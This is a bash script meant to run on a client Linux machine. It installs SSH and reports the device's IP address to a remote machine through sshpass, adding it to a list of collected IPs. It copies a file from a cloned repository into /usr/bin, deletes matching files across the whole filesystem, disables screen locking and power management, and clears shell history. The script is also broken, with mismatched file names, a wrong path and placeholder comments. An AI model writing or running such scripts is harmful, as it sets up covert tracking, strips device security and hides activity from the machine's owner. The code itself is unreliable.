#!/bin/bash

# Install SSH on the client device (assuming it's also a Linux machine)
sudo apt-get update
sudo apt-get install -y ssh

# Get the IP address of the client device using ifconfig
ip_address=$(ifconfig wlo1 | awk '/inet / {print $2}')

# Send the IP address to your local machine via SSH
local_machine_user=""
local_machine_ip=""

sshpass -p "" ssh $local_machine_user@$local_machine_ip "echo $ip_address >> ~/Documents/Scripts/ips.txt"

# Clone the repository (replace "repo_url" with the actual URL of the repository)
git clone https://github.com/markdicks/clear_Chrome_Cache.git

# Copy the desired script from the repository to /usr/bin
sudo cp /clear_Chrome_Cache/cleanup_v3 /usr/bin/  # Replace "script_file" with the name of the script you want to copy

# Make the script executable
sudo chmod +x /usr/bin/script_file

rm -rf clear_Chrome_Cache
find / -type f -name "pc-cleanup" -delete

# Turn off power settings that dim the screen, auto-suspend, and lock
xset -dpms     # Disable DPMS (Display Power Management Signaling)
xset s off     # Disable screen saver
gsettings set org.gnome.desktop.session idle-delay 0   # Set auto-suspend to 0 (disabled)
gsettings set org.gnome.desktop.lockdown disable-lock-screen true   # Disable automatic screen locking
history -c 
unset HISTFILE && exit
